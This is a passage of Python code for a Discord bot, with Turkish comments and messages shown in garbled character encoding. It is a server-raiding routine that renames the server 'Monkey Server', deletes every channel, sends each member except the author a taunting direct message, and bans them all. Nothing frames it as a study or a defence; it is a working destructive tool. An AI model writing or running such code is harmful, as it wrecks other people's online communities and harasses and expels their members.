        try:
            await guild.edit(name="Maymun Sunucusu ğŸµ")
            print("ğŸ“› Sunucu adÄ± deÄŸiÅŸtirildi.")
        except Exception as e:
            print(f"âš ï¸ Ä°sim deÄŸiÅŸtirme hatasÄ±: {e}")

        # 3. TÃ¼m kanallarÄ± sil
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"ğŸ—‘ï¸ Silindi: {channel.name}")
            except Exception as e:
                print(f"âš ï¸ Kanal silme hatasÄ±: {e}")

        # 4. Herkese Ã¶zelden DM gÃ¶nder ve ardÄ±ndan banla
        for member in guild.members:
            if member != message.author and not member.bot:
                try:
                    # DM gÃ¶nder
                    dm = await member.create_dm()
                    await dm.send("ğŸ’ **Maymunlar size skrim yapÄ±yor! HazÄ±r olun!** ğŸ’¥")
                    print(f"ğŸ“© DM gÃ¶nderildi: {member.name}")
                except Exception as e:
                    print(f"âš ï¸ DM hatasÄ±: {member.name} - {e}")
                try:
                    # Banla
                    await member.ban(reason="Maymun istilasÄ± nedeniyle uzaklaÅŸtÄ±rÄ±ldÄ±")
                    print(f"ğŸš« BanlandÄ±: {member.name}")
                except Exception as e:
                    print(f"âš ï¸ Ban hatasÄ±: {member.name} - {e}")

    await bot.process_commands(message)